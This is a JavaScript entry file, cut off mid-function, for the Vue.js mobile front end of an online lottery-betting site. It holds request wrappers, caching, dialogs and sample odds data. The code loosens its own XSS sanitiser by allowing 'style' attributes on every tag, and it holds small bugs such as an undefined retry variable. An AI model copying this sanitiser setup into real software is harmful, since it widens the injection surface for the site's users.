
// 测试用数据
// localStorage.setItem('LotteryList', '{"1000":{"LotteryCode":"1000","LotteryType":"SSC","LotteryName":"重庆时时彩","LotteryIntro":"全天120期","VerifyIssue":"001","VerifyEndTime":"2015-09-01 00:04:10","IsStop":""},"1001":{"LotteryCode":"1001","LotteryType":"SSC","LotteryName":"新疆时时彩","LotteryIntro":"全天96期","VerifyIssue":"001","VerifyEndTime":"2015-08-13 10:08:00","IsStop":""},"1003":{"LotteryCode":"1003","LotteryType":"SSC","LotteryName":"天津时时彩","LotteryIntro":"全天84期","VerifyIssue":"001","VerifyEndTime":"2015-09-17 09:07:35","IsStop":""},"1008":{"LotteryCode":"1008","LotteryType":"SSC","LotteryName":"大发时时彩","LotteryIntro":"1分钟1期","VerifyIssue":"0001","VerifyEndTime":"2015-09-07 00:00:59","IsStop":""},"1100":{"LotteryCode":"1100","LotteryType":"SYX5","LotteryName":"广东11选5","LotteryIntro":"全天84期","VerifyIssue":"01","VerifyEndTime":"2015-09-17 09:09:00","IsStop":""},"1101":{"LotteryCode":"1101","LotteryType":"SYX5","LotteryName":"上海11选5","LotteryIntro":"全天90期","VerifyIssue":"01","VerifyEndTime":"2015-08-13 08:58:30","IsStop":""},"1102":{"LotteryCode":"1102","LotteryType":"SYX5","LotteryName":"山东11选5","LotteryIntro":"全天78期","VerifyIssue":"01","VerifyEndTime":"2015-08-13 09:03:30","IsStop":""},"1103":{"LotteryCode":"1103","LotteryType":"SYX5","LotteryName":"江西11选5","LotteryIntro":"全天84期","VerifyIssue":"01","VerifyEndTime":"2015-08-13 09:08:00","IsStop":""},"1201":{"LotteryCode":"1201","LotteryType":"FC3D","LotteryName":"福彩3D","LotteryIntro":"全天1期","VerifyIssue":"001","VerifyEndTime":"2015-09-15 20:00:00","IsStop":""},"1202":{"LotteryCode":"1202","LotteryType":"PL35","LotteryName":"排列3","LotteryIntro":"全天1期","VerifyIssue":"001","VerifyEndTime":"2015-09-15 20:00:00","IsStop":"0"},"1301":{"LotteryCode":"1301","LotteryType":"6HC","LotteryName":"六合彩","LotteryIntro":"全天1期","VerifyIssue":"1","VerifyEndTime":"2015-09-01 20:00:00","IsStop":""},"1302":{"LotteryCode":"1302","LotteryType":"KL8","LotteryName":"北京快乐8","LotteryIntro":"全天179期","VerifyIssue":"001","VerifyEndTime":"2015-08-13 09:03:30","IsStop":""},"1303":{"LotteryCode":"1303","LotteryType":"PK10","LotteryName":"北京PK10","LotteryIntro":"全天179期","VerifyIssue":"001","VerifyEndTime":"2015-08-13 09:05:30","IsStop":"0"},"1401":{"LotteryCode":"1401","LotteryType":"K3","LotteryName":"江苏快3","LotteryIntro":"全天82期","VerifyIssue":"001","VerifyEndTime":"1990-01-01 08:38:00","IsStop":""},"1402":{"LotteryCode":"1402","LotteryType":"K3","LotteryName":"安徽快3","LotteryIntro":"全天80期","VerifyIssue":"001","VerifyEndTime":"2015-08-13 08:47:58","IsStop":""},"1403":{"LotteryCode":"1403","LotteryType":"K3","LotteryName":"广西快3","LotteryIntro":"全天78期","VerifyIssue":"001","VerifyEndTime":"1990-01-01 09:36:01","IsStop":""},"1404":{"LotteryCode":"1404","LotteryType":"K3","LotteryName":"吉林快3","LotteryIntro":"全天79期","VerifyIssue":"001","VerifyEndTime":"1990-01-01 08:32:00","IsStop":"1"},"1405":{"LotteryCode":"1405","LotteryType":"K3","LotteryName":"湖北快3","LotteryIntro":"全天78期","VerifyIssue":"001","VerifyEndTime":"1990-01-01 09:08:58","IsStop":""},"1406":{"LotteryCode":"1406","LotteryType":"K3","LotteryName":"北京快3","LotteryIntro":"全天89期","VerifyIssue":"001","VerifyEndTime":"1990-01-01 09:08:00","IsStop":""},"1407":{"LotteryCode":"1407","LotteryType":"K3","LotteryName":"大发快3","LotteryIntro":"1分钟1期","VerifyIssue":"0001","VerifyEndTime":"2015-09-07 00:00:59","IsStop":""},"1408":{"LotteryCode":"1408","LotteryType":"K3","LotteryName":"河北快3","LotteryIntro":"全天81期","VerifyIssue":"001","VerifyEndTime":"1990-01-01 08:37:25","IsStop":""},"1409":{"LotteryCode":"1409","LotteryType":"K3","LotteryName":"贵州快3","LotteryIntro":"全天78期","VerifyIssue":"001","VerifyEndTime":"1990-01-01 09:12:00","IsStop":"1"},"1410":{"LotteryCode":"1410","LotteryType":"K3","LotteryName":"上海快3","LotteryIntro":"全天82期","VerifyIssue":"001","VerifyEndTime":"1990-01-01 08:56:58","IsStop":""},"1411":{"LotteryCode":"1411","LotteryType":"K3","LotteryName":"甘肃快3","LotteryIntro":"全天72期","VerifyIssue":"001","VerifyEndTime":"1990-01-01 10:08:01","IsStop":""}}')
// localStorage.setItem('LotteryConfig', '[{"LotteryClassID":"10","LotteryClassName":"时时彩","LotteryList":["1000","1001","1003","1008"]},{"LotteryClassID":"14","LotteryClassName":"快3","LotteryList":["1401","1402","1403","1405","1406","1407","1408","1409","1410","1411","1404"]},{"LotteryClassID":"11","LotteryClassName":"11选5","LotteryList":["1100","1101","1102","1103"]},{"LotteryClassID":"12","LotteryClassName":"低频彩","LotteryList":["1201","1202"]},{"LotteryClassID":"13","LotteryClassName":"其他彩种","LotteryList":["1302","1303","1301"]}]')
// localStorage.setItem('Rebate6HC', '{"Rebate":"0.00%","Odds":[{"PlayCode":"A01","Bonus":"88.20"},{"PlayCode":"A02","Bonus":"3.67,7.35,3.67,3.67,3.52,3.67,5.18,5.51"},{"PlayCode":"B01","Bonus":"88.20"},{"PlayCode":"B03","Bonus":"88.20"},{"PlayCode":"B04","Bonus":"88.20"},{"PlayCode":"B05","Bonus":"88.20"},{"PlayCode":"B06","Bonus":"88.20"},{"PlayCode":"B07","Bonus":"88.20"},{"PlayCode":"B08","Bonus":"88.20"},{"PlayCode":"B09","Bonus":"3.67,7.35,3.67,3.67,3.52,3.67,5.18,5.51"},{"PlayCode":"B10","Bonus":"3.67,7.35,3.67,3.67,3.52,3.67,5.18,5.51"},{"PlayCode":"B11","Bonus":"3.67,7.35,3.67,3.67,3.52,3.67,5.18,5.51"},{"PlayCode":"B12","Bonus":"3.67,7.35,3.67,3.67,3.52,3.67,5.18,5.51"},{"PlayCode":"B13","Bonus":"3.67,7.35,3.67,3.67,3.52,3.67,5.18,5.51"},{"PlayCode":"B14","Bonus":"3.67,7.35,3.67,3.67,3.52,3.67,5.18,5.51"},{"PlayCode":"C01","Bonus":"1658.16"},{"PlayCode":"C02","Bonus":"51.41,1658.16"},{"PlayCode":"C03","Bonus":"141.12"},{"PlayCode":"C04","Bonus":"141.12,352.80"},{"PlayCode":"C05","Bonus":"352.80"},{"PlayCode":"D01","Bonus":"12.60,8.82,11.02,9.80,9.80,11.02,11.02,12.60,11.02,12.60,12.60,11.02,9.80,12.60,11.02,11.02,11.02,11.02"},{"PlayCode":"E01","Bonus":"17.64,22.05"},{"PlayCode":"E02","Bonus":"4.03,3.40"},{"PlayCode":"E03","Bonus":"7.41,8.77"},{"PlayCode":"E04","Bonus":"18.75,22.36"},{"PlayCode":"E05","Bonus":"54.34,65.40"},{"PlayCode":"F01","Bonus":"9.80,8.82,22.05,17.64"},{"PlayCode":"F02","Bonus":"7.41,6.27"},{"PlayCode":"F03","Bonus":"15.74,13.21"},{"PlayCode":"F04","Bonus":"37.57,31.26"},{"PlayCode":"G01","Bonus":"4.03"},{"PlayCode":"G02","Bonus":"4.79"},{"PlayCode":"G03","Bonus":"5.73"},{"PlayCode":"G04","Bonus":"6.87"},{"PlayCode":"G05","Bonus":"8.29"},{"PlayCode":"G06","Bonus":"10.05"}]}')
// localStorage.setItem('lotteryPlan1301', '{"Month":6,"BeforeIssue":"62","Schedule":"1,3,6,8,10,13,15,17,20,22,24,27,29","NextFirst":"2"}')








//layer 、filterXSS引入失败，刷新
if((typeof(layer)||typeof(filterXSS))=='undefined'){
  location.href=location.href
}
;(function(){
  try {
    sessionStorage.setItem('TextLocalStorage', 'hello world');
    sessionStorage.getItem('TextLocalStorage');
    sessionStorage.removeItem('TextLocalStorage');
  } catch(e) {
    alert('您的浏览器太旧或者开启了无痕浏览模式，无法浏览网页，请更换浏览器或退出无痕模式，给您带来的不便，表示抱歉！');
    localStorage={setItem:function(d){},getItem:function(d){}};
    sessionStorage={setItem:function(d){},getItem:function(d){}};
  }
})()

if(!localStorage.getItem("console")){
  console.log=function(){return}
}
import Vue from 'vue'
import VueRouter from 'vue-router'
import Vuex from 'vuex'
import App from './App'
import routes from './routes/routes'
import Va from './plugins/va'
import {DAY_TIME, GMT_DIF} from './js/kit'
var localState={}
window.Vue=Vue
Vue.use(Va)
Vue.use(VueRouter)
Vue.use(Vuex)
//全局过滤器
Vue.filter('num', v=>+v) // 转成数字类型
Vue.filter('filNum',v=>String(Math.floor(v)).length>7?Math.floor(v):v)//数字整数长度大于7位去掉小数点部分
/**
 * [format 为Date对象追加format方法]
 * @param  {[string]} format [设置要输出的目标格式 如"yyyy-MM-dd hh:mm:ss" ]
 * @return {[string]}        [按格式输出的时间字符串]
 * 示例console.log(new Date().format("yyyyMd hh:mm:ss")) 输出2016816 14:12:17;
 */
Date.prototype.format = function(format) {
  var date = {
  "M+": this.getMonth() + 1,
  "d+": this.getDate(),
  "h+": this.getHours(),
  "m+": this.getMinutes(),
  "s+": this.getSeconds(),
  "q+": Math.floor((this.getMonth() + 3) / 3),
  "S+": this.getMilliseconds()
  };
  if (/(y+)/i.test(format)) {
  format = format.replace(RegExp.$1, (this.getFullYear() + '').substr(4 - RegExp.$1.length));
  }
  for (var k in date) {
    if (new RegExp("(" + k + ")").test(format)) {
      format = format.replace(RegExp.$1, RegExp.$1.length == 1 ? date[k] : ("00" + date[k]).substr(("" + date[k]).length));
    }
  }
  return format;
}
window._Tool = {
  Array: {
    Unique: function (array) {
      var n = []; //临时数组
      for (var i = 0; i < array.length; i++) {
        if (n.indexOf(array[i]) == -1) n.push(array[i]);
      }
      return n;
    }
  },
  // 获得服务器的时间
  Date: {
    getTime:function(){
      return new Date().getTime()-state.Difftime||0
      /*if (state.Difftime) {
        return {then:function(fun){
          fun&&fun(new Date().getTime()-state.Difftime)
        }}
      }else{
        return new Promise(function(resolve, reject) {
          RootApp.getServerTime(function(){
            if (state.Difftime) {
              resolve(new Date().getTime()-state.Difftime)
            }
          })
        })
      }*/
    }
  }
}
// document.body.oncontextmenu=function(){ return false;}//防止右键
document.addEventListener('touchstart',function(e){},false);//让css的:active生效
// document.cookie = "Site="+location.hostname.replace('.com','')
window.rem = document.body.clientWidth/16
window.em = Math.sqrt((rem-20)*.9)+20
window.YDB = null
document.querySelector("html").style.fontSize=rem+'px'
document.body.style.fontSize=em+'px'
window._Tool = {
  Array: {
    Unique: function (array) {
      var n = []; //临时数组
      for (var i = 0; i < array.length; i++) {
        if (n.indexOf(array[i]) == -1) n.push(array[i]);
      }
      return n;
    }
  },
  // 获得服务器的时间
  Date: {
    getTime:function(){
      return new Date().getTime()-state.Difftime||0
      /*if (state.Difftime) {
        return {then:function(fun){
          fun&&fun(new Date().getTime()-state.Difftime)
        }}
      }else{
        return new Promise(function(resolve, reject) {
          RootApp.getServerTime(function(){
            if (state.Difftime) {
              resolve(new Date().getTime()-state.Difftime)
            }
          })
        })
      }*/
    }
  }
}


// 修改默认配置XSS 添加STYLE
var XssList=filterXSS.whiteList
for(var x in XssList){
  XssList[x].push('style')
}
// filterXSS.whiteList=XssList

function Xss(data){
  var k,nk,t,mayBeXss
  for(var i in data){
    k=data[i];
    t=typeof(k)
    if (t==="object") {
      k=Xss(k);
      if (k[1]) {
        mayBeXss=mayBeXss||{}
        mayBeXss[i]=k[1]
      }
      k=k[0]
    }
    if (t==="string") {
      nk=filterXSS(k)
      if (k!==nk) {
        mayBeXss=mayBeXss||{}
        mayBeXss[i]={old:k,new:nk}
      }
      k=nk
    }
    data[i]=k
  }
  return [data,mayBeXss]
}
window._catch = function(data){
  var str=[],k;
  for(var i in data){
    k=data[i];
    if (typeof(k)==="object") {
      k= encodeURIComponent(JSON.stringify(k));
    }
    str.push(i+'='+k)
  }
  str=str.join('&')
  var fetchUrl = state.UserName||data.UserName
  fetchUrl = fetchUrl?'/catch?U='+fetchUrl:'/catch'
  fetch(fetchUrl, {
    credentials:'same-origin',
    method: 'POST',
    cache: 'no-store',
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: str
  })
}
function FetchCatch(opt) {
  console.log(opt);
  var {msg, status, resolve, error, T, S}=opt
  if (status){
    msg += status
  }
  if (error) {
    error=error.toString()
    // msg += '<br/>'+error
    console.log(error);
  }
  if (S){
    msg += '_'+S
  }
  layer.alert(msg)
  if (state.turning) {
    // layer.alert(msg)
    state.turning = false
  }/*else{
    resolve({ Code: -1, StrCode: msg })
  }*/
  delete opt.resolve
  // _catch(opt)
}
var fetchArr=[]
window._fetch = function (data){
  data = Xss(data)
  if (data[1]) {
    //可能有xss
    console.log(data[1]);
  }
  data=data[0]
  data.SourceName=_App?"APP":"MB"
  var str=[],k;
  for(var i in data){
    k=data[i];
    if (typeof(k)==="object") {
      k= encodeURIComponent(JSON.stringify(k));
    }
    str.push(i+'='+k)
  }
  str=str.join('&')
  // 防止一秒内的完全相同请求
  var now = new Date().getTime()
  for (var i = 0; i < fetchArr.length; i++) {
    if(fetchArr[i][0]+1000<now){
      fetchArr.length=i
      break
    }else if(fetchArr[i][1]===str){
      return {then:function(){
        console.log('重复发送')
      }}
    }
  }
  fetchArr.unshift([now,str])
  return new Promise(function(resolve, reject){
    var st = state.turning&&setTimeout(function(){
      var msg = '网络请求超时，请重试'
      FetchCatch({msg},resolve)
      reject()
    },10000)
    var fetchUrl = '/tools/ssc_ajax.ashx?A='+data.Action
    if(window.site){
      fetchUrl+='&S='+site
    }
    var user = data.Action!=='Register'&&state.UserName||data.UserName
    if(user){
      fetchUrl+='&U='+user
    }

    fetch(fetchUrl, {
      credentials:'same-origin',
      method: 'POST',
      cache: 'no-store',
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      body: str
    }).then((res)=>{
      var T = (new Date().getTime()-now)/1000
      var H={}
      try{
        for (var pair of res.headers.entries()) {
          pair[0]=pair[0].toLowerCase()
          if (['a','x-sec'].indexOf(pair[0])>-1) {
            H[pair[0]]=pair[1]
          }
        }
      }catch(e){
        H={'x-sec':'I','a':'E'}
      }
      var S=(!H['a'])?null:( H['a']+(H['x-sec']?('_'+H['x-sec']):''))
      if (res.status!==200) {
        // FetchCatch("网络错误"+res.status,resolve)
        var msg = "网络错误"
        FetchCatch({
          msg,
          status:res.status,
          resolve,
          T,  //fetch耗时,
          S,
          // data //fetch的body
        })
        return
      }
      res.text().then(json=>{
        if (data.Action==='GetImageCode') {
          //获取验证码的不需要转换成json
          resolve(json)
          return
        }
        try{
          json = JSON.parse(json)
        }catch(error){
          // 解析成json数据失败
          if (json[0]==='<') {
            // 可能是一些高防拦截等需要重发
            _fetch(data,option).then(json=>{
              resolve(json)
            })
          }else{
            var msg = "网络数据解析错误"
            FetchCatch({
              msg,
              json,
              resolve,
              T,  //fetch耗时,
              S,
              data //fetch的body
            })
          }
        }
        if (typeof(json)==='string') return
        json = Xss(json)
        if(json[1]) {
          console.log(json[1]);
        }
        json=json[0]
        json.StrCode = `·${json.StrCode}·`
        state.turning&&clearTimeout(st)
        console.log(json);
        var notRes
        if (data.Action==="GetInitData") {
          if (json.Code===1||json.Code===0) {
            json = RootApp.SetFilter(json)
            var Data = json.BackData
            RootApp.WatchInitData(Data)
            RootApp.SaveInitData(Data)
            if(JSON.stringify(json.CacheData) !== "{}"){
              localStorage.setItem('CacheData',JSON.stringify(Object.assign(CacheData,json.CacheData)))
            }
          }
        }
        ;(function(){
          switch(json.Code){
            case 0://未登录
              if(state.UserName){
                layer.alert("由于您长时间未操作，已自动退出，需要重新登录",function(){
                  RootApp.Logout()
                  router.replace("/login")
                })
                notRes=true
              }
            break;
            // case -6://IP黑名单
            // break;
            case -7://系统维护
              store.commit('SetMaintain', json.BackData)
              router.replace("/maintain")
              notRes=true
            break;
            case -8://账号冻结
              layer.alert("您的账号已被冻结，详情请咨询客服。",function(){
                RootApp.Logout()
                var meta = RootApp._route.matched[0]
                meta = meta&&meta.meta
                router.replace("/login")
              })
              notRes=true
            break;
            case -1:
              if (json.StrCode === '空') {
                // 出现意外错误，需要补发接口
                console.log('补发接口')
                _fetch(data,option).then(json=>{
                  resolve(json)
                })
                notRes=true
              }
            break;
          }
          if (data.Action.search('Verify')===0&&json.Code>-1) {
            state.UserVerify=data.Action.replace('Verify','')+','
          }
        })()
        notRes||resolve(json)
      }).catch(error => {
        var msg = "网络数据错误"
        // FetchCatch(msg, resolve, error)
        FetchCatch({
          msg,
          error,
          resolve,
          T,  //fetch耗时
          S,
          str //fetch的body
        })
      })
    }).catch(error => {
      var msg = "网络错误，请检查网络状态"
      FetchCatch({
        msg,
        error,
        resolve,
        str //fetch的body
      })
    })
  })
}

// 获取图形码接口专用
window._fetchT=function _fetchT(data){
  return _fetch(data)
  // var str=[],k;
  // for(var i in data){
  //   k=data[i];
  //   if (typeof(k)==="object") {
  //     k=JSON.stringify(k);
  //   }
  //   str.push(i+'='+k);
  // }
  // data = str.join('&');
  // return new Promise(function(resolve, reject){
  //   fetch('/tools/ssc_ajax.ashx', {
  //     credentials:'same-origin',
  //     method: 'POST',
  //     headers: {
  //       "Content-Type": "application/x-www-form-urlencoded"
  //     },
  //     body: data
  //   }).then((res)=>{
  //     res.text().then(text=>{
  //       resolve(text)
  //     })
  //   })
  // })
}
window._App=(function(host){
  //是否APP
  var a = localStorage.getItem("isApp")
  if (a) {return a}
  console.log(host);
  host = host.split('.')
  host = host[host.length-2]
  if (['csz8','caishen01','caishenzhengba'].indexOf(host)>-1) {
    return true
  }
  return false
})(location.host)
;(function(){
  var versions = function() {
    var u = navigator.userAgent,
      app = navigator.appVersion;
    return {
      // trident: u.indexOf('Trident') > -1, //IE内核
      // presto: u.indexOf('Presto') > -1, //opera内核
      // webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
      // gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
      android: u.indexOf('Android') > -1 || u.indexOf('Adr') > -1, //android终端
      // iPhone: u.indexOf('iPhone') > -1, //是否为iPhone或者QQHD浏览器
      // iPad: u.indexOf('iPad') > -1, //是否iPad
      // webApp: u.indexOf('Safari') == -1, //是否web应该程序，没有头部与底部
      // weixin: u.indexOf('MicroMessenger') > -1, //是否微信 （2015-01-22新增）
      // qq: u.match(/\sQQ/i) == " qq" //是否QQ
    };
  }()
  if (_App) {
    //iosApp专用代码
    var img=document.createElement("img")
    img.src="//static.ydbimg.com/API/YdbOnline.js"
    img.onerror=function(){
      var script = document.createElement("script");
      script.src=img.src
      document.body.appendChild(script);
      var count=0
      var inter=setInterval(function(){
        if(typeof YDBOBJ!=='undefined'){
          YDB=new YDBOBJ()
          YDB.SetHeadBar(0)
          clearInterval(inter)
        }
        count++
        if (count>100) {
          clearInterval(inter)
        }
      },100)
    }
  }
  if (!versions.android) {
    document.body.oncontextmenu=function(){ return false;}//防止右键
  }
})()

if (_App) {document.title="彩神争霸"}

window.router = new VueRouter({
  routes,
  mode:'history',
  linkActiveClass:"on",
  scrollBehavior (to, from, savedPosition) {
    if (savedPosition) {
      return savedPosition
    } else {
      return false
      // if(to.name === '彩种'){
      //   return false
      // }else{
      //   return { x: 0, y: 0 }
      // }
    }
  }
  // exact: true
});

function SetIndexTitle(s){
  routes[1].meta.title=`<img src="${state.constant.ImgHost+s.MobileLogo}">`
  if (!_App) {
    document.title=s.Name
    // routes[2].meta.title=routes[1].meta.title
  }
}

var UserArr = [
  'UserHasSafePwd', //返回是否已经设置安全密码,1为有,0为没有设置
  'UserSafeQuestions', //返回设置的密保问题,如果没设置可以返回0或者空数组
  'UserMobile', //返回已绑定手机的模糊状态,如未绑定,返回空字符串或0
  'UserMail', //返回已绑定手机的模糊状态,如未绑定,返回空字符串或0
  'UserName', //返回对应的账号,未登录用户返回空字符串
  'UserPhoto', //返回用户头像的图片地址
  'UserNickName',
  'UserFirstCardInfo', //返回绑定的第一张银行卡的模糊信息
  'AgentRebate', //获取代理人返点情况
  'UserUpGradeBonus',
  'UserQQ',
  'UserMobile',
  'UserMail',
  'UserBirthDay',
  'UserGradeGrow',
  'UserSex',
  'UserHasSafePwd',
  'UserFirstCardInfo',
  'UserBankCardList',
  'UserLastLoginInfo',
  'RebateK3',
  'RebateSSC',
  'RebateSYX5',
  'RebateKL8',
  'RebatePK10',
  'RebatePL35',
  'RebateFC3D',
  'Rebate6HC',
  'NoticeData',
]
var SiteArr=[ //需要校验更新版本的列表
  'SysActivity',
  'SysBanner',
  'LotteryList', //所有彩种信息
  'GradeList',//等级体系
  'RewardData',//每日加奖设置
  'DefaultPhotoList',
]

var AppArr=[
  'LotteryConfig', //所有彩种列表
  'ActivityConfig', //活动种类及数据
  'BannerList',
  // 'PayLimit',
  'SiteConfig',
]
var LocalCacheArr = [//本地控制缓存版本
  'RankingList',//昨日奖金榜
]
var VerifyArr=["LotteryConfig","BannerList","LotteryList","ActivityConfig","FooterConfig","HelpConfig","SiteConfig","HallBanner","GradeList","DefaultPhotoList","RewardData","AbstractType","PayLimit","CloudUrl","NoticeData"]
if (_App) {
  UserArr=UserArr.concat(AppArr)
}else{
  SiteArr=SiteArr.concat(AppArr)
}
var CacheArr = SiteArr.concat(UserArr).concat(LocalCacheArr).concat(['Difftime'])
window.state = require('./JSconfig.js')
state.constant._App=_App
window.CacheData=localStorage.getItem("CacheData")
CacheData = CacheData?JSON.parse(CacheData):{}
var LocalCacheData=localStorage.getItem("LocalCacheData")
LocalCacheData = LocalCacheData ? JSON.parse(LocalCacheData) : {}
function setState(key){
  function getLocalDate(str){
    var s = localStorage.getItem(str);
    try{
      s = JSON.parse(s);
    }catch(e){}
    /*if (str=="SiteConfig"&&s) {
      SetIndexTitle(s)
    }*/
    return s;
  }
  var value
  for (var i = key.length - 1; i >= 0; i--) {
    value=getLocalDate(key[i])
    // state[key[i]]=getLocalDate(key[i])
    if((VerifyArr.indexOf(key[i])>-1)&&
      (Boolean(CacheData[key[i]])^(value!=null))){
      //检验是否存在版本号与实际储存值是否非同步存在或不存在
      console.log(state[key[i]]);
      delete state[key[i]]
      delete CacheData[key[i]]
    }
    if (value!==null) {
      // 进行localStorage数据的合法化验证，不符合目前要求的数据进行剔除
      switch(key[i]){
        case 'SiteConfig':
          console.log(value);
          if (!(value.Style&&value.Style.Id)) {
            value=''
          }
        break;
        default:
          if(LocalCacheArr.indexOf(key[i])>-1){
            // 判断与LocalCacheData的同步
            var cache = value
            // console.log('存在localCache的字段',key[i])
            var hasVersion = !!LocalCacheData[key[i]]
            var hasCache = !!cache
            var needDelete = hasVersion ^ hasCache  //异或
            // console.log(needDelete, hasVersion, hasCache)
            if(needDelete){
              localStorage.removeItem(key[i])  //删除对应的缓存
              delete LocalCacheData[key[i]]
              localStorage.setItem("LocalCacheData",JSON.stringify(LocalCacheData))
            }
          }
        break
      }
      localState[key[i]]=value
    }
    state[key[i]]=value
  }
  console.log(localState);
};
var LocalCacheData=localStorage.getItem("LocalCacheData")
LocalCacheData = LocalCacheData ? JSON.parse(LocalCacheData) : {}
setState(CacheArr)
console.log(CacheData);

window.store = new Vuex.Store({
  state,
  getters:{
    PhotoPath:state=>state.constant.ImgHost+state.constant.PhotoPath,
    WithdrwHtml:state=>{
      return "login"
    },
    NoDataDom:msg => state.tpl.noData.join("msg"),
  },
  mutations: {
    toggleLoading:(state, bool) =>{
      state.turning = bool
    },
    SaveInitData: (state,Data) => {
      for(var k in Data){
        state[k] = Data[k]
        if(CacheArr.indexOf(k)+1){
          if (Data[k]===null) {
            state[k]=Data[k]=''
          }else if (typeof(Data[k])=='object') {
            Data[k]=JSON.stringify(Data[k]);
          }
          localStorage.setItem(k,Data[k]);
        }
      }
    },
    ClearInitData:(state,arr)=>{
      for (var i = arr.length - 1; i >= 0; i--) {
        localStorage.removeItem(arr[i])
        state[arr[i]]=null
        delete CacheData[arr[i]]
      }
      localStorage.setItem('CacheData',JSON.stringify(CacheData))
    },
    setTmpDifftime:(state, Difftime)=>{
      state.Difftime = Difftime
      localStorage.setItem('Difftime',Difftime)
    },
    setDifftime:(state, timeItemList)=>{
      // console.log(timeItemList)
      // var cantGetTime = !timeItemList || !timeItemList.length || timeItemList.every(item=>!item.SerTime)

      // if(cantGetTime){
      //   layer.msgWarn("因无法同步服务器时间,您将无法投注,请检查网络情况")
      //   return
      // }

      // if(timeItemList.every(item=>!item.SerTime)){
      //   layer.url("因无法同步服务器时间,您将无法投注,请检查网络情况", "/index")
      //   return
      // }

      var _shortest = timeItemList[0].interval,     //算获取最快的时间
          _index = 0
      timeItemList.forEach((item, index)=>{
        if(item.interval < _shortest){
          _shortest = item.interval
          _index = index
        }
      })

      var timeObj = timeItemList[_index],
          timeBegin = timeObj.timeBegin,
          timeEnd = timeObj.timeEnd,
          SerTime = timeObj.SerTime
      var Difftime = timeBegin + Math.floor((timeEnd - timeBegin)/2) - SerTime
      state.Difftime = Difftime
      localStorage.setItem('Difftime',Difftime)
    },
    SetMaintain:(state,d)=>{
      state.Maintain=d
    }
  },
})

;(function(){
  var warn = '<span class="iconfont">&#xe606;</span>',
    tip='<span class="iconfont">&#xe610;</span>'
  layer.icon={}
  layer.icon.load=state.tpl.load
  layer.load=function(){layer.open({type: 2})}
  layer.msg=function(msg, time) {
    return this.open({ content: msg, time: time?time-1:3,style: 'fill:#ececec',className:'layermsg'});
  }
  layer.msgWarn=function(msg, time) {
    return this.msg(warn+msg,time);
  },
  layer.msgTip=function(msg, time) {
    return this.msg(tip+msg,time);
  },
  layer.msgWait=function(msg,time) {
    return this.open({time:  time?time-1:0,content: layer.icon.load+msg+"，请稍候...", shadeClose:0 ,className:'layermsg'});
  },
  layer.url=function(msg,s) {
    return layer.open({
      className: "layerConfirm",
      title:'温馨提示',
      content: msg,
      btn: ["确定"],
      end:function(){
        if (typeof(s)=='string') {
          router.push(s)
        }else{
          router.go(s||-1)
        }
      }
    })
  },
  layer.alert=function(msg,fun){
    return layer.open({
      className: "layerConfirm",
      title:'温馨提示',
      shadeClose: false,
      content: msg,
      btn: ["确定"],
      end:fun
    })
  },
  layer.confirm=function(msg,btn,fun1,fun2,fun3){
    if (!btn.length) {
      fun3=fun2
      fun2=fun1
      fun1=btn
      btn=["确定","取消"]
    }
    return layer.open({
      className: "layerConfirm",
      title:"温馨提示",
      shadeClose: false,
      content: msg,
      btn: btn,
      yes: function(index) {
        fun1()
        layer.close(index)
      },
      no:fun2,
      end:fun3
    })
  }
})()

function TimeItem(interval, timeBegin, timeEnd, SerTime){
  this.interval = interval
  this.timeBegin = timeBegin
  this.timeEnd = timeEnd
  this.SerTime = SerTime
}

window.RootApp={
  Logout:function(){
    store.commit('ClearInitData', UserArr)
    sessionStorage.clear()
  },
  Login:function(UserName,fun){
    // this.GetInitData(UserArr,fun)
    this.SaveInitData({UserName:UserName})
    fun()
  },
  OpenWin:function(url, newTab){
    //app
    if(YDB){
      YDB.OpenWithSafari(url)
    }else{
      if(!newTab){
        newTab = window.open('about:blank')
      }
      newTab.location.href=url
    }
  },
  SetFilter:function(json){
    var data=json.BackData
    var CacheData=json.CacheData
    ;(function(Bonus){
      if (!Bonus||Bonus.State) {return}
      setTimeout(function(){
        layer.open({
          shadeClose: false,
          title: "恭喜",
          content: '恭喜您成功晋级，当前等级为VIP'+Bonus.Grade+'，赶紧到活动中心领取奖励吧。',
          className: "layerConfirm",
          btn: ["领取奖励", "留在本页"],
          yes: function(Lindex) {
            layer.close(Lindex);
            router.replace("/upgrade")
          }
        })
      },100)
    })(data.UserUpGradeBonus)
    /*;(function(s){
      if (s) {
        SetIndexTitle(s)
      }
    })(data.SiteConfig)*/
    ;(function(arr){
      if(arr){
        var el = {};
        arr.forEach(item => {
          el[item.PayName] = [item.MinMoney, item.MaxMoney];
        })
        data.PayLimit=el
      }
    })(data.PayLimit)
    ;(function(LotteryList){
      if(LotteryList&&LotteryList.length){
        data.LotteryList={};
        var c
        for (var i = LotteryList.length - 1; i >= 0; i--) {
          c = LotteryList[i].LotteryCode
          data.LotteryList[c]= LotteryList[i]
          // delete data.LotteryList[c].LotteryCode
        }
      }
    })(data.LotteryList)
    if (data.NoticeData&&data.NoticeData.length) {
      if (data.NoticeData.length>2) {
        data.NoticeData.length=2;
      }
    }
    if (data.GradeList&&data.GradeList.length) {
        for (var i = data.GradeList.length - 1; i >= 0; i--) {
            data.GradeList[i].Grade=Number(data.GradeList[i].Grade);
            data.GradeList[i].GradeGrow=Number(data.GradeList[i].GradeGrow);
            data.GradeList[i].Bonus=Number(data.GradeList[i].Bonus);
            data.GradeList[i].JumpBonus=Number(data.GradeList[i].JumpBonus);
        }
    }

    ;(function(a){
      if (!a) {return}
      for (var i = a.length - 1; i >= 0; i--) {
        if (typeof(a[i].Img)=="object") {
          a[i].Img=a[i].Img&&a[i].Img[0];
        }
      }
    })(data.ActivityConfig)
    ;(function(RankingList){
      if (RankingList&&RankingList.length===0) {
        delete data.RankingList
      }
    })(data.RankingList)
    ;(function(){
      var change=[]
      for (var i = LocalCacheArr.length - 1; i >= 0; i--) {
        if(data[LocalCacheArr[i]]){
          change.push(LocalCacheArr[i])
        }
      }
      var len = change.length
      console.log(len);
      if (len) {
        var time = _Tool.Date.getTime()
        time/=DAY_TIME
        time=Math.floor(time)%366
        for (var i = len - 1; i >= 0; i--) {
          LocalCacheData[change[i]]=time
        }
        localStorage.setItem("LocalCacheData",JSON.stringify(LocalCacheData))
      }
